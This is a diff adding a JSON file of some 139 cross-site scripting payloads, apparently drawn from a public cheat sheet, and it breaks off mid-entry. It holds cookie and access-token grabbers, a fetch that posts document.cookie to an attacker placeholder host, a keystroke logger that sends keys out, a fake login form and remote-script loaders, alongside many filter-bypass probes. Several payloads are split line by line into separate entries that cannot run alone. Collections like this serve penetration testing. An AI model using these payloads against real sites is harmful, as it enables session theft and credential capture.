@@ -1,0 +1,1487 @@
+[
+  {
+    "id": "xss-1",
+    "title": "Data Grabber",
+    "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>",
+    "context": "Data Grabber",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-2",
+    "title": "Data Grabber",
+    "payload": "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>",
+    "context": "Data Grabber",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-3",
+    "title": "Data Grabber",
+    "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+document.cookie;</script>",
+    "context": "Data Grabber",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-4",
+    "title": "Data Grabber",
+    "payload": "<script>new Image().src=\"http://localhost/cookie.php?c=\"+localStorage.getItem('access_token');</script>",
+    "context": "Data Grabber",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-5",
+    "title": "Data Grabber",
+    "payload": "fwrite($fp, 'Cookie:' .$cookie.\"\\r\\n\");",
+    "context": "Data Grabber",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-6",
+    "title": "Data Grabber",
+    "payload": "fclose($fp);",
+    "context": "Data Grabber",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-7",
+    "title": "CORS",
+    "payload": "<script>",
+    "context": "CORS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-8",
+    "title": "CORS",
+    "payload": "fetch('https://[ATTACKER.DOMAIN.TLD]', {",
+    "context": "CORS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-9",
+    "title": "CORS",
+    "payload": "method: 'POST',",
+    "context": "CORS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-10",
+    "title": "CORS",
+    "payload": "mode: 'no-cors',",
+    "context": "CORS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-11",
+    "title": "CORS",
+    "payload": "body: document.cookie",
+    "context": "CORS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-12",
+    "title": "CORS",
+    "payload": "});",
+    "context": "CORS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-13",
+    "title": "CORS",
+    "payload": "</script>",
+    "context": "CORS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-14",
+    "title": "UI Redressing",
+    "payload": "history.replaceState(null, null, '../../../login');",
+    "context": "UI Redressing",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-15",
+    "title": "UI Redressing",
+    "payload": "document.body.innerHTML = \"</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>\"",
+    "context": "UI Redressing",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-16",
+    "title": "Javascript Keylogger",
+    "payload": "<img src=x onerror='document.onkeypress=function(e){fetch(\"http://[ATTACKER.DOMAIN.TLD]/?k=\"+String.fromCharCode(e.which))},this.remove();'>",
+    "context": "Javascript Keylogger",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-17",
+    "title": "Identify an XSS Endpoint",
+    "payload": "<script>debugger;</script>",
+    "context": "Identify an XSS Endpoint",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-18",
+    "title": "Identify an XSS Endpoint",
+    "payload": "<script>alert(document.domain.concat(\"\\n\").concat(window.origin))</script>",
+    "context": "Identify an XSS Endpoint",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-19",
+    "title": "Identify an XSS Endpoint",
+    "payload": "<script>console.log(\"Test XSS from the search bar of page XYZ\\n\".concat(document.domain).concat(\"\\n\").concat(window.origin))</script>",
+    "context": "Identify an XSS Endpoint",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-20",
+    "title": "Common Payloads",
+    "payload": "<script>alert('XSS')</script>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-21",
+    "title": "Common Payloads",
+    "payload": "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-22",
+    "title": "Common Payloads",
+    "payload": "\"><script>alert('XSS')</script>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-23",
+    "title": "Common Payloads",
+    "payload": "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-24",
+    "title": "Common Payloads",
+    "payload": "<script>\\u0061lert('22')</script>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-25",
+    "title": "Common Payloads",
+    "payload": "<script>eval('\\x61lert(\\'33\\')')</script>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-26",
+    "title": "Common Payloads",
+    "payload": "<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt(\"confirm\",30) == 8680439 && 8680439..toString(30) == \"confirm\"",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-27",
+    "title": "Common Payloads",
+    "payload": "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;\">",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-28",
+    "title": "Common Payloads",
+    "payload": "<img src=x onerror=alert('XSS');>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-29",
+    "title": "Common Payloads",
+    "payload": "<img src=x onerror=alert('XSS')//",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-30",
+    "title": "Common Payloads",
+    "payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-31",
+    "title": "Common Payloads",
+    "payload": "<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-32",
+    "title": "Common Payloads",
+    "payload": "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-33",
+    "title": "Common Payloads",
+    "payload": "\"><img src=x onerror=alert('XSS');>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-34",
+    "title": "Common Payloads",
+    "payload": "\"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-35",
+    "title": "Common Payloads",
+    "payload": "<><img src=1 onerror=alert(1)>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-36",
+    "title": "Common Payloads",
+    "payload": "<svg\fonload=alert(1)>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-37",
+    "title": "Common Payloads",
+    "payload": "<svg/onload=alert('XSS')>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-38",
+    "title": "Common Payloads",
+    "payload": "<svg onload=alert(1)//",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-39",
+    "title": "Common Payloads",
+    "payload": "<svg/onload=alert(String.fromCharCode(88,83,83))>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-40",
+    "title": "Common Payloads",
+    "payload": "<svg id=alert(1) onload=eval(id)>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-41",
+    "title": "Common Payloads",
+    "payload": "\"><svg/onload=alert(String.fromCharCode(88,83,83))>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-42",
+    "title": "Common Payloads",
+    "payload": "\"><svg/onload=alert(/XSS/)",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-43",
+    "title": "Common Payloads",
+    "payload": "<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-44",
+    "title": "Common Payloads",
+    "payload": "<svg><script>alert('33')",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-45",
+    "title": "Common Payloads",
+    "payload": "<svg><script>alert&lpar;'33'&rpar;",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-46",
+    "title": "Common Payloads",
+    "payload": "<div onpointerover=\"alert(45)\">MOVE HERE</div>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-47",
+    "title": "Common Payloads",
+    "payload": "<div onpointerdown=\"alert(45)\">MOVE HERE</div>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-48",
+    "title": "Common Payloads",
+    "payload": "<div onpointerenter=\"alert(45)\">MOVE HERE</div>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-49",
+    "title": "Common Payloads",
+    "payload": "<div onpointerleave=\"alert(45)\">MOVE HERE</div>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-50",
+    "title": "Common Payloads",
+    "payload": "<div onpointermove=\"alert(45)\">MOVE HERE</div>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-51",
+    "title": "Common Payloads",
+    "payload": "<div onpointerout=\"alert(45)\">MOVE HERE</div>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-52",
+    "title": "Common Payloads",
+    "payload": "<div onpointerup=\"alert(45)\">MOVE HERE</div>",
+    "context": "Common Payloads",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-53",
+    "title": "XSS using HTML5 tags",
+    "payload": "<body onload=alert(/XSS/.source)>",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-54",
+    "title": "XSS using HTML5 tags",
+    "payload": "<input autofocus onfocus=alert(1)>",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-55",
+    "title": "XSS using HTML5 tags",
+    "payload": "<select autofocus onfocus=alert(1)>",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-56",
+    "title": "XSS using HTML5 tags",
+    "payload": "<textarea autofocus onfocus=alert(1)>",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-57",
+    "title": "XSS using HTML5 tags",
+    "payload": "<keygen autofocus onfocus=alert(1)>",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-58",
+    "title": "XSS using HTML5 tags",
+    "payload": "<video/poster/onerror=alert(1)>",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-59",
+    "title": "XSS using HTML5 tags",
+    "payload": "<video><source onerror=\"javascript:alert(1)\">",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-60",
+    "title": "XSS using HTML5 tags",
+    "payload": "<video src=_ onloadstart=\"alert(1)\">",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-61",
+    "title": "XSS using HTML5 tags",
+    "payload": "<details/open/ontoggle=\"alert`1`\">",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-62",
+    "title": "XSS using HTML5 tags",
+    "payload": "<audio src onloadstart=alert(1)>",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-63",
+    "title": "XSS using HTML5 tags",
+    "payload": "<marquee onstart=alert(1)>",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-64",
+    "title": "XSS using HTML5 tags",
+    "payload": "<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-65",
+    "title": "XSS using HTML5 tags",
+    "payload": "<body ontouchstart=alert(1)> // Triggers when a finger touch the screen",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-66",
+    "title": "XSS using HTML5 tags",
+    "payload": "<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-67",
+    "title": "XSS using HTML5 tags",
+    "payload": "<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.",
+    "context": "XSS using HTML5 tags",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-68",
+    "title": "XSS using a remote JS",
+    "payload": "<svg/onload='fetch(\"//host/a\").then(r=>r.text().then(t=>eval(t)))'>",
+    "context": "XSS using a remote JS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-69",
+    "title": "XSS using a remote JS",
+    "payload": "<script src=14.rs>",
+    "context": "XSS using a remote JS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-70",
+    "title": "XSS using a remote JS",
+    "payload": "e.g: 14.rs/#alert(document.domain)",
+    "context": "XSS using a remote JS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-71",
+    "title": "XSS in Hidden Input",
+    "payload": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">",
+    "context": "XSS in Hidden Input",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-72",
+    "title": "XSS in Hidden Input",
+    "payload": "Use CTRL+SHIFT+X to trigger the onclick event",
+    "context": "XSS in Hidden Input",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-73",
+    "title": "XSS in Hidden Input",
+    "payload": "<input type=\"hidden\" oncontentvisibilityautostatechange=\"alert(1)\"  style=\"content-visibility:auto\" >",
+    "context": "XSS in Hidden Input",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-74",
+    "title": "XSS in Uppercase Output",
+    "payload": "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
+    "context": "XSS in Uppercase Output",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-75",
+    "title": "XSS in JS Context",
+    "payload": "-(confirm)(document.domain)//",
+    "context": "XSS in JS Context",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-76",
+    "title": "Wrapper javascript",
+    "payload": "javascript:prompt(1)",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-77",
+    "title": "Wrapper javascript",
+    "payload": "%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-78",
+    "title": "Wrapper javascript",
+    "payload": "&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-79",
+    "title": "Wrapper javascript",
+    "payload": "We can encode the \"javascript:\" in Hex/Octal",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-80",
+    "title": "Wrapper javascript",
+    "payload": "\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-81",
+    "title": "Wrapper javascript",
+    "payload": "\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-82",
+    "title": "Wrapper javascript",
+    "payload": "\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-83",
+    "title": "Wrapper javascript",
+    "payload": "We can use a 'newline character'",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-84",
+    "title": "Wrapper javascript",
+    "payload": "java%0ascript:alert(1)   - LF (\\n)",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-85",
+    "title": "Wrapper javascript",
+    "payload": "java%09script:alert(1)   - Horizontal tab (\\t)",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-86",
+    "title": "Wrapper javascript",
+    "payload": "java%0dscript:alert(1)   - CR (\\r)",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-87",
+    "title": "Wrapper javascript",
+    "payload": "Using the escape character",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-88",
+    "title": "Wrapper javascript",
+    "payload": "\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-89",
+    "title": "Wrapper javascript",
+    "payload": "Using the newline and a comment //",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-90",
+    "title": "Wrapper javascript",
+    "payload": "javascript://%0Aalert(1)",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-91",
+    "title": "Wrapper javascript",
+    "payload": "javascript://anything%0D%0A%0D%0Awindow.alert(1)",
+    "context": "Wrapper javascript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-92",
+    "title": "Wrapper data",
+    "payload": "data:text/html,<script>alert(0)</script>",
+    "context": "Wrapper data",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-93",
+    "title": "Wrapper data",
+    "payload": "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+",
+    "context": "Wrapper data",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-94",
+    "title": "Wrapper data",
+    "payload": "<script src=\"data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\"></script>",
+    "context": "Wrapper data",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-95",
+    "title": "Wrapper vbscript",
+    "payload": "vbscript:msgbox(\"XSS\")",
+    "context": "Wrapper vbscript",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-96",
+    "title": "XSS in Files",
+    "payload": "<name>",
+    "context": "XSS in Files",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-97",
+    "title": "XSS in Files",
+    "payload": "<value><![CDATA[<script>confirm(document.domain)</script>]]></value>",
+    "context": "XSS in Files",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-98",
+    "title": "XSS in Files",
+    "payload": "</name>",
+    "context": "XSS in Files",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-99",
+    "title": "XSS in XML",
+    "payload": "<html>",
+    "context": "XSS in XML",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-100",
+    "title": "XSS in XML",
+    "payload": "<head></head>",
+    "context": "XSS in XML",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-101",
+    "title": "XSS in XML",
+    "payload": "<body>",
+    "context": "XSS in XML",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-102",
+    "title": "XSS in XML",
+    "payload": "<something:script xmlns:something=\"http://www.w3.org/1999/xhtml\">alert(1)</something:script>",
+    "context": "XSS in XML",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-103",
+    "title": "XSS in XML",
+    "payload": "</body>",
+    "context": "XSS in XML",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-104",
+    "title": "XSS in XML",
+    "payload": "</html>",
+    "context": "XSS in XML",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-105",
+    "title": "XSS in SVG",
+    "payload": "<?xml version=\"1.0\" standalone=\"no\"?>",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-106",
+    "title": "XSS in SVG",
+    "payload": "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-107",
+    "title": "XSS in SVG",
+    "payload": "<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-108",
+    "title": "XSS in SVG",
+    "payload": "<polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-109",
+    "title": "XSS in SVG",
+    "payload": "<script type=\"text/javascript\">",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-110",
+    "title": "XSS in SVG",
+    "payload": "alert(document.domain);",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-111",
+    "title": "XSS in SVG",
+    "payload": "</svg>",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-112",
+    "title": "XSS in SVG",
+    "payload": "<svg version=\"1.1\" baseProfile=\"full\" width=\"100\" height=\"100\" xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('svg attribut')\">",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-113",
+    "title": "XSS in SVG",
+    "payload": "<polygon id=\"lightning\" points=\"0,100 50,25 50,75 100,0\" fill=\"#ff1919\" stroke=\"#ff0000\"/>",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-114",
+    "title": "XSS in SVG",
+    "payload": "<desc><script>alert('svg desc')</script></desc>",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-115",
+    "title": "XSS in SVG",
+    "payload": "<foreignObject><script>alert('svg foreignObject')</script></foreignObject>",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-116",
+    "title": "XSS in SVG",
+    "payload": "<foreignObject width=\"500\" height=\"500\">",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-117",
+    "title": "XSS in SVG",
+    "payload": "<iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert('svg foreignObject iframe');\" width=\"400\" height=\"250\"/>",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-118",
+    "title": "XSS in SVG",
+    "payload": "</foreignObject>",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-119",
+    "title": "XSS in SVG",
+    "payload": "<title><script>alert('svg title')</script></title>",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-120",
+    "title": "XSS in SVG",
+    "payload": "<animatetransform onbegin=\"alert('svg animatetransform onbegin')\"></animatetransform>",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-121",
+    "title": "XSS in SVG",
+    "payload": "alert('svg script');",
+    "context": "XSS in SVG",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-122",
+    "title": "Short SVG Payload",
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>",
+    "context": "Short SVG Payload",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-123",
+    "title": "Short SVG Payload",
+    "payload": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
+    "context": "Short SVG Payload",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-124",
+    "title": "Short SVG Payload",
+    "payload": "<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>",
+    "context": "Short SVG Payload",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-125",
+    "title": "Short SVG Payload",
+    "payload": "<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>",
+    "context": "Short SVG Payload",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-126",
+    "title": "Nesting SVG and XSS",
+    "payload": "<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">",
+    "context": "Nesting SVG and XSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-127",
+    "title": "Nesting SVG and XSS",
+    "payload": "<image xlink:href=\"http://10.10.10.10:9999/red_lightning_xss_full.svg\" height=\"200\" width=\"200\"/>",
+    "context": "Nesting SVG and XSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-128",
+    "title": "Nesting SVG and XSS",
+    "payload": "<use xlink:href=\"http://10.10.10.10:9999/red_lightning_xss_full.svg#lightning\"/>",
+    "context": "Nesting SVG and XSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-129",
+    "title": "Nesting SVG and XSS",
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">",
+    "context": "Nesting SVG and XSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-130",
+    "title": "Nesting SVG and XSS",
+    "payload": "<svg x=\"10\">",
+    "context": "Nesting SVG and XSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-131",
+    "title": "Nesting SVG and XSS",
+    "payload": "<rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #002654\"/>",
+    "context": "Nesting SVG and XSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-132",
+    "title": "Nesting SVG and XSS",
+    "payload": "<script type=\"text/javascript\">alert('sub-svg 1');</script>",
+    "context": "Nesting SVG and XSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-133",
+    "title": "Nesting SVG and XSS",
+    "payload": "<svg x=\"200\">",
+    "context": "Nesting SVG and XSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-134",
+    "title": "Nesting SVG and XSS",
+    "payload": "<rect x=\"10\" y=\"10\" height=\"100\" width=\"100\" style=\"fill: #ED2939\"/>",
+    "context": "Nesting SVG and XSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-135",
+    "title": "Nesting SVG and XSS",
+    "payload": "<script type=\"text/javascript\">alert('sub-svg 2');</script>",
+    "context": "Nesting SVG and XSS",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-136",
+    "title": "XSS in Markdown",
+    "payload": "[a](javascript:prompt(document.cookie))",
+    "context": "XSS in Markdown",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-137",
+    "title": "XSS in Markdown",
+    "payload": "[a](j a v a s c r i p t:prompt(document.cookie))",
+    "context": "XSS in Markdown",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-138",
+    "title": "XSS in Markdown",
+    "payload": "[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)",
+    "context": "XSS in Markdown",
+    "tags": [
+      "xss"
+    ]
+  },
+  {
+    "id": "xss-139",
+    "title": "XSS in Markdown",
+    "payload": "[a](javascript:window.onerror=alert;throw%201)",
+    "context": "XSS in Markdown",
